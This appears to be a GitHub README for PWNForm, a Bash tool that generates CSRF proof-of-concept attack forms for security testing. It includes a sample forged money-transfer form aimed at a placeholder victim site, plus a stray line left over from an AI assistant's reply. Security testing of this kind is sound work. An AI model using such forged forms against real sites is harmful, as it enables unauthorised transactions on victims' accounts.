<h1>PWNForm - CSRF PoC Generator</h1>
<img src=https://github.com/user-attachments/assets/9fa34937-be16-4743-9a2d-a906e5868b1a onerror=x width=800 />
Here’s how your README file should be structured based on your script's functionality:


---



Overview

PWNForm is an automated Bash script that generates a CSRF (Cross-Site Request Forgery) Proof-of-Concept (PoC) attack form. It allows penetration testers and security researchers to quickly generate PoC exploits that can be used to test web applications for CSRF vulnerabilities.

With PWNForm, you can:

Easily create an interactive CSRF attack form.

Generate an HTML-based PoC that allows parameter modification.

Automatically serve the PoC via a local Python HTTP server.

Open the PoC in a browser instantly.



---

Features

✅ Interactive Input – The script prompts the user for a target URL, HTTP method, and request body.
✅ Automatic HTML Generation – A properly formatted CSRF attack form is generated based on user input.
✅ Local HTTP Server – A Python HTTP server is launched to serve the PoC file.
✅ Browser Auto-Launch – Opens the PoC automatically in the browser for immediate testing.
✅ Port Selection – Allows users to specify a custom port for the HTTP server.
✅ Handles URL-Encoding – Decodes and properly formats URL-encoded request bodies.


---

Installation

Prerequisites

Ensure you have the following installed:

Bash (Linux/macOS/WSL recommended)

Python3 (for the built-in HTTP server)

xdg-open (or equivalent command to open URLs)


Clone the Repository

git clone https://github.com/Demgainschill/PWNForm.git
cd PWNForm


---

Usage

Basic Usage

Run the script with:

./pwnform.sh

OR specify a custom port:

./pwnform.sh -p 8080

Example Run

1. Enter the target URL:
Example: https://victim.com/transfer


2. Select the request method:
Example: POST


3. Paste the full request body:
Example: amount=100&recipient=attacker



The script will:

Generate a csrf_poc.html file.

Start a local Python HTTP server.

Open the PoC in your default browser.


Expected Output

Generating CSRF PoC...
CSRF PoC HTML saved as csrf_poc.html
Starting Python HTTP server on port 8000...
PoC available at http://localhost:8000/csrf_poc.html


---

Generated CSRF PoC Example

<form id="csrfForm" action="https://victim.com/transfer" method="POST">
    <label for='amount'><strong>amount:</strong></label>
    <input type='text' name='amount' id='amount' value='100'><br><br>
    <label for='recipient'><strong>recipient:</strong></label>
    <input type='text' name='recipient' id='recipient' value='attacker'><br><br>
    <input type="submit" value="Send CSRF Request">
</form>


---




<img src=https://github.com/user-attachments/assets/cd18729e-8440-4c96-8ac5-bb8822179b60 onerror=pwnform.gif width=800 />

<img src=https://github.com/user-attachments/assets/56def11a-062a-4a33-bc01-45ff4c4721db onerror=pwnfid.mp4 width=800 />

